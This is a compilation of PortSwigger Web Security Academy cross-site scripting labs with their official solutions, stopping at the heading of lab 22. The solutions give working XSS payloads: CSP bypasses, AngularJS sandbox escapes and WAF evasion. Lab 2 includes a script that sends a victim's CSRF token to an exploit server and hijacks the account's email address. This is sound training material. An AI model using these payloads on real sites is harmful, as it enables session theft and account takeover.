# PortSwigger labs: cross site scripting

> Copied from <https://portswigger.net/web-security/cross-site-scripting>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. Reflected XSS protected by CSP, with CSP bypass

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)

This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the `alert` function.

Please note that the intended solution to this lab is only possible in Chrome.

<details><summary>Official solution</summary>

1. Enter the following into the search box:

   `<img src=1 onerror=alert(1)>`
2. Observe that the payload is reflected, but the CSP prevents the script from executing.
3. In Burp Proxy, observe that the response contains a `Content-Security-Policy` header, and the `report-uri` directive contains a parameter called `token`. Because you can control the `token` parameter, you can inject your own CSP directives into the policy.
4. Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:

   `https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27`

The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just `script` elements. Using this directive, you can overwrite existing `script-src` rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=hx9DjDxuYOE

</details>


## 2. Reflected XSS protected by very strict CSP, with dangling markup attack

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

This lab uses a strict CSP that prevents the browser from loading subresources from external domains.

To solve the lab, perform a form hijacking attack that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to `hacker@evil-user.net`.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

`<a href="">Click me</a>`

You can log in to your own account using the following credentials: `wiener:peter`

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server.

<details><summary>Hint</summary>

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

</details>

<details><summary>Official solution</summary>

1. Log in to the lab using the credentials provided above.
2. Interact with the change email function. Notice that the injection of common XSS attack payloads, such as `<img src onerror=alert(1)>`, is blocked by client-side validation.
3. Use the browser DevTools to inspect the `email input` element. Notice that:

   - You can change its type from `email` to `text` to bypass the client-side validation.
   - Within the form there is a hidden input field that includes a CSRF token. This indicates that it is necessary for the email change process.
4. Change the payload to `foo@example.com"><img src= onerror=alert(1)>`, embedding it within a valid email format. This makes the input appear legitimate in order to bypass client-side validation.
5. Submit the payload. Notice that it is reflected on the page but is correctly escaped, meaning it does not execute as a script. This indicates that the server is properly sanitizing the input, and that additional security measures such as CSP may also be in place to block the execution of malicious scripts.

   Now that we have identified and bypassed client-side validation, our next step is to test how the server handles and sanitizes reflected inputs and to check for the presence of additional security measures like CSP.
6. Add a query parameter called `email` to the end of the page URL and use it to attempt inserting the payload again. For example:
   `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>`
7. Load this URL. Notice that your payload is reflected on the page, but the code doesn't run. This is likely because the CSP blocks it.
8. To confirm this, check the browser DevTools console for any CSP-related messages. You should see a message indicating that the inline script was blocked due to the CSP.

   Now that we've confirmed that CSP is blocking our XSS payload, our next step is to try to bypass this protection by checking for weaknesses in the CSP, such as a missing `form-action` directive.
9. Go to the exploit server and copy its URL, including `/exploit`. For example:
   `https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit`
10. Back in the lab, use the XSS vulnerability in the way the `email` query parameter is processed to inject a button. For example:
    `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button
    formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click
    me</button>`

    Make sure that you include the following:

    - An `email` query parameter. This is necessary to trigger the XSS vulnerability and inject the button.
    - An email value in a valid format to ensure the input passes client-side validation. This email value must be closed with a quotation mark to prevent syntax errors and ensure the injected button becomes part of the HTML structure. Without this, the browser might not interpret the HTML correctly, causing the injection to fail.
    - A button containing a `formaction` attribute pointing to the copied exploit server's URL. This directs the form submission to the exploit server when the button is clicked.
11. Load this URL. Notice your injected button appears on the page, and that the **Email** form is populated with a valid email format.
12. Click your new button. You are taken to the exploit server. This demonstrates that our attack was able to bypass the site's security and allow redirection of form submissions to an external server.
13. Notice that the CSRF token is not visible in the URL. This is because the form is submitted via the `POST` method, which sends data in the body rather than in the URL.

    Because the CSRF token is necessary for the email change process, we won't be able to induce the lab to change the user's email without it. Our next step is to capture the CSRF token by adjusting our approach to use the `GET` method, ensuring the token is included in the URL.
14. Go back to the lab. Re-inject the button with its `formaction` attribute. This time, also add the `formmethod="get"` attribute so that the form is submitted with a GET request. For example:
    `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit"
    formmethod="get">Click me</button>`
15. Click your new button. You are taken to the exploit server with the CSRF token now visible in the URL.

    We're now ready to begin our attack.
16. Return to the exploit server and enter the following attack script into the Body field:
    `` <body>
    <script>
    // Define the URLs for the lab environment and the exploit server.
    const academyFrontend = "https://your-lab-url.net/";
    const exploitServer = "https://your-exploit-server.net/exploit";
    // Extract the CSRF token from the URL.
    const url = new URL(location);
    const csrf = url.searchParams.get('csrf');
    // Check if a CSRF token was found in the URL.
    if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');
    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;
    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';
    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();
    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
    } else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
    }
    </script>
    </body> ``
17. Replace the `academyFrontend` and `exploitServer` URLs with the URLs of your lab environment and exploit server respectively.
18. Click **Store**, then **Deliver exploit to victim**. The user's email will be changed to `hacker@evil-user.net`.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=hp_djQ62GEc

</details>


## 3. Reflected XSS with AngularJS sandbox escape and CSP

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)

This lab uses CSP and AngularJS.

To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts `document.cookie`.

<details><summary>Official solution</summary>

1. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:

   `<script>
   location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
   </script>`
2. Click "Store" and "Deliver exploit to victim".

The exploit uses the `ng-focus` event in AngularJS to create a focus event that bypasses CSP. It also uses `$event`, which is an AngularJS variable that references the event object. The `path` property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the `window` object.

Normally, `|` is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the `orderBy` filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the `alert` function directly, we assign it to the variable `z`. The function will only be called when the `orderBy` operation reaches the `window` object in the `$event.path` array. This means it can be called in the scope of the window without an explicit reference to the `window` object, effectively bypassing AngularJS's `window` check.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=ezCHiuFRTMA

</details>


## 4. Reflected XSS with AngularJS sandbox escape without strings

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)

This lab uses AngularJS in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.

To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the `alert` function without using the `$eval` function.

<details><summary>Official solution</summary>

Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:

`https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

The exploit uses `toString()` to create a string without using quotes. It then gets the `String` prototype and overwrites the `charAt` function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the `orderBy` filter. We then set the argument for the filter by again using `toString()` to create a string and the `String` constructor property. Finally, we use the `fromCharCode` method generate our payload by converting character codes into the string `x=alert(1)`. Because the `charAt` function has been overwritten, AngularJS will allow this code where normally it would not.

</details>

<details><summary>Community solutions</summary>

##### Michael Sommer

https://www.youtube.com/watch?v=pln9RRbB5CI

</details>


## 5. Reflected XSS into attribute with angle brackets HTML-encoded

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

<details><summary>Hint</summary>

Just because you're able to trigger the `alert()` yourself doesn't mean that this will work on the victim. You may need to try injecting your proof-of-concept payload with a variety of different attributes before you find one that successfully executes in the victim's browser.

</details>

<details><summary>Official solution</summary>

1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a quoted attribute.
3. Replace your input with the following payload to escape the quoted attribute and inject an event handler:

   `"onmouseover="alert(1)`
4. Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in the browser. When you move the mouse over the injected element it should trigger an alert.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=Nhk9arXIM94

##### Michael Sommer

https://www.youtube.com/watch?v=8zis9TrZmfU

</details>


## 6. Reflected XSS in canonical link tag

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)

This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the `alert` function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

- `ALT+SHIFT+X`
- `CTRL+ALT+X`
- `Alt+X`

Please note that the intended solution to this lab is only possible in Chrome.

<details><summary>Official solution</summary>

1. Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:

   `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`

   This sets the `X` key as an access key for the whole page. When a user presses the access key, the `alert` function is called.
2. To trigger the exploit on yourself, press one of the following key combinations:
   - On Windows: `ALT+SHIFT+X`
   - On MacOS: `CTRL+ALT+X`
   - On Linux: `Alt+X`

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=9kwDn7IGkW0

##### Michael Sommer

https://www.youtube.com/watch?v=WYfdEI_wt80

</details>


## 7. Reflected XSS with event handlers and href attributes blocked

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)

This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked.

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the `alert` function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

`<a href="">Click me</a>`

<details><summary>Official solution</summary>

Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:

`https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E`

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=SGi_IkgyKew

##### Michael Sommer

https://www.youtube.com/watch?v=jDKcR72RhWM

</details>


## 8. Stored XSS into anchor href attribute with double quotes HTML-encoded

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

<details><summary>Official solution</summary>

1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
3. Observe that the random string in the second Repeater tab has been reflected inside an anchor `href` attribute.
4. Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert:

   `javascript:alert(1)`
5. Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=3jFVfS9BsDc

##### Michael Sommer

https://www.youtube.com/watch?v=-wgninydB2s

</details>


## 9. Reflected XSS into HTML context with all tags blocked except custom ones

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.

<details><summary>Official solution</summary>

1. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:

   `<script>
   location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
   </script>`
2. Click "Store" and "Deliver exploit to victim".

This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=sjs6RS7lURk

##### Michael Sommer

https://www.youtube.com/watch?v=nXO6BPJ1c1M

</details>


## 10. Reflected XSS into HTML context with most tags and attributes blocked

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function.

#### Note

Your solution must not require any user interaction. Manually causing `print()` to be called in your own browser will not solve the lab.

<details><summary>Official solution</summary>

1. Inject a standard XSS vector, such as:

   `<img src=1 onerror=print()>`
2. Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
4. In Burp Intruder, replace the value of the search term with: `<>`
5. Place the cursor between the angle brackets and click **Add §** to create a payload position. The value of the search term should now look like: `<§§>`
6. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy
   tags to clipboard**.
7. In the **Payloads** side panel, under **Payload configuration**, click **Paste** to paste the list of tags into the payloads list. Click  **Start attack**.
8. When the attack is finished, review the results. Note that most payloads caused a `400` response, but the `body` payload caused a `200` response.
9. Go back to Burp Intruder and replace your search term with:

   `<body%20=1>`
10. Place the cursor before the `=` character and click **Add §** to create a payload position. The value of the search term should now look like: `<body%20§§=1>`
11. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click
    **Copy events to clipboard**.
12. In the **Payloads** side panel, under **Payload configuration**, click **Clear** to remove the previous payloads. Then click **Paste** to paste the list of attributes into the payloads list. Click  **Start attack**.
13. When the attack is finished, review the results. Note that most payloads caused a `400` response, but the `onresize` payload caused a `200` response.
14. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:

    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
15. Click **Store** and **Deliver exploit to victim**.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=NIUsJZhGvFs

##### Michael Sommer

https://www.youtube.com/watch?v=iqP70bJ4xWg

</details>


## 11. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

<details><summary>Official solution</summary>

1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
4. Try sending the payload `test\payload` and observe that your backslash doesn't get escaped.
5. Replace your input with the following payload to break out of the JavaScript string and inject an alert:

   `\'-alert(1)//`
6. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=2qZMHqlJwKc

##### Michael Sommer

https://www.youtube.com/watch?v=jPwJfaaLeBc

</details>


## 12. Reflected XSS into a JavaScript string with angle brackets HTML encoded

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

<details><summary>Official solution</summary>

1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Replace your input with the following payload to break out of the JavaScript string and inject an alert:

   `'-alert(1)-'`
4. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=eIHGNgibcjA

##### Michael Sommer

https://www.youtube.com/watch?v=es0lzwq0GSg

</details>


## 13. Reflected XSS into a JavaScript string with single quote and backslash escaped

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

<details><summary>Official solution</summary>

1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
4. Replace your input with the following payload to break out of the script block and inject a new script:

   `</script><script>alert(1)</script>`
5. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=OwcT9ahQlSU

##### Michael Sommer

https://www.youtube.com/watch?v=wHwJ-8zs_oA

</details>


## 14. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.

<details><summary>Official solution</summary>

1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript template string.
3. Replace your input with the following payload to execute JavaScript inside the template string: `${alert(1)}`
4. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=y0onQRBnwMM

##### Michael Sommer

https://www.youtube.com/watch?v=kO8G7qUR00k

</details>


## 15. Reflected XSS in a JavaScript URL with some characters blocked

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.

To solve the lab, perform a cross-site scripting attack that calls the `alert` function with the string `1337` contained somewhere in the `alert` message.

<details><summary>Official solution</summary>

Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:

`https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`

The lab will be solved, but the alert will only be called if you click "Back to blog" at the bottom of the page.

The exploit uses exception handling to call the `alert` function with arguments. The `throw` statement is used, separated with a blank comment in order to get round the no spaces restriction. The `alert` function is assigned to the `onerror` exception handler.

As `throw` is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the `throw` statement can be used. We then need to call this function, so we assign it to the `toString` property of `window` and trigger this by forcing a string conversion on `window`.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=bCpBD--GCtQ

##### Michael Sommer

https://www.youtube.com/watch?v=nxks6IODMtE

</details>


## 16. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

<details><summary>Official solution</summary>

1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
3. Observe that the random string in the second Repeater tab has been reflected inside an `onclick` event handler attribute.
4. Repeat the process again but this time modify your input to inject a JavaScript URL that calls `alert`, using the following payload:

   `http://foo?&apos;-alert(1)-&apos;`
5. Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert.

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=-4ia_L-uLGY

##### Michael Sommer

https://www.youtube.com/watch?v=TG8-LZ_dE9w

</details>


## 17. Reflected XSS with some SVG markup allowed

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.

<details><summary>Official solution</summary>

1. Inject a standard XSS payload, such as:

   `<img src=1 onerror=alert(1)>`
2. Observe that this payload gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.
3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.
4. In the request template, replace the value of the search term with: `<>`
5. Place the cursor between the angle brackets and click **Add §** to create a payload position. The value of the search term should now be: `<§§>`
6. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy tags to clipboard**.
7. In Burp Intruder, in the **Payloads** side panel, click **Paste** to paste the list of tags into the payloads list. Click  **Start attack**.
8. When the attack is finished, review the results. Observe that all payloads caused a `400` response, except for the ones using the `<svg>`, `<animatetransform>`, `<title>`, and `<image>` tags, which received a `200` response.
9. Go back to the **Intruder** tab and replace your search term with:

   `<svg><animatetransform%20=1>`
10. Place the cursor before the `=` character and click **Add §** to create a payload position. The value of the search term should now be:

    `<svg><animatetransform%20§§=1>`
11. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy events to clipboard**.
12. In Burp Intruder, in the **Payloads** side panel, click **Clear** to remove the previous payloads. Then click
    **Paste** to paste the list of attributes into the payloads list. Click  **Start attack**.
13. When the attack is finished, review the results. Note that all payloads caused a `400` response, except for the `onbegin` payload, which caused a
    `200` response.

    Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved:

    `https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=7dKk4A6viWo

##### Intigriti

https://www.youtube.com/watch?v=0kfQsRwr_Bc

##### Michael Sommer

https://www.youtube.com/watch?v=80vn2dLQW04

</details>


## 18. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.

<details><summary>Official solution</summary>

1. Enter a random alphanumeric string into the search box.
2. View the page source and observe that your random string is enclosed in an `ng-app` directive.
3. Enter the following AngularJS expression in the search box:

   `{{$on.constructor('alert(1)')()}}`
4. Click **search**.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=P7_JPsX1ses

##### z3nsh3ll

https://www.youtube.com/watch?v=QpQp2JLn6JA

##### Michael Sommer

https://www.youtube.com/watch?v=9RVgvuGsEo8

</details>


## 19. DOM XSS in document.write sink using source location.search inside a select element

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.

<details><summary>Official solution</summary>

1. On the product pages, notice that the dangerous JavaScript extracts a `storeId` parameter from the `location.search` source. It then uses `document.write` to create a new option in the select element for the stock checker functionality.
2. Add a `storeId` query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.
3. In the browser, notice that your random string is now listed as one of the options in the drop-down list.
4. Right-click and inspect the drop-down list to confirm that the value of your `storeId` parameter has been placed inside a select element.
5. Change the URL to include a suitable XSS payload inside the `storeId` parameter as follows:

   `product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`

</details>

<details><summary>Community solutions</summary>

##### Intigriti

https://www.youtube.com/watch?v=ojiOCfg-FXU

##### z3nsh3ll

https://www.youtube.com/watch?v=UPvX_h3h_SI

##### Michael Sommer

https://www.youtube.com/watch?v=AsR-YeaD5Iw

</details>


## 20. DOM XSS in document.write sink using source location.search

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

<details><summary>Official solution</summary>

1. Enter a random alphanumeric string into the search box.
2. Right-click and inspect the element, and observe that your random string has been placed inside an `img src` attribute.
3. Break out of the `img` attribute by searching for:

   `"><svg onload=alert(1)>`

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=JZgqsijAa-s

##### Michael Sommer

https://www.youtube.com/watch?v=thgkc3axJaI

</details>


## 21. Reflected DOM XSS

[Open the lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the `alert()` function.

<details><summary>Official solution</summary>

1. In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.
2. Back in the lab, go to the target website and use the search bar to search for a random test string, such as `"XSS"`.
3. Return to the Proxy tool in Burp Suite and forward the request.
4. On the Intercept tab, notice that the string is reflected in a JSON response called `search-results`.
5. From the Site Map, open the `searchResults.js` file and notice that the JSON response is used with an `eval()` function call.
6. By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.
7. To solve this lab, enter the following search term:

   `\"-alert(1)}//`

As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.

An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the `alert()` function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:

`{"searchTerm":"\\"-alert(1)}//", "results":[]}`

</details>

<details><summary>Community solutions</summary>

##### z3nsh3ll

https://www.youtube.com/watch?v=bg_xH4Dp-6E

##### Michael Sommer

https://www.youtube.com/watch?v=yzhK6ofzFtc

</details>


## 22. Stored DOM XSS

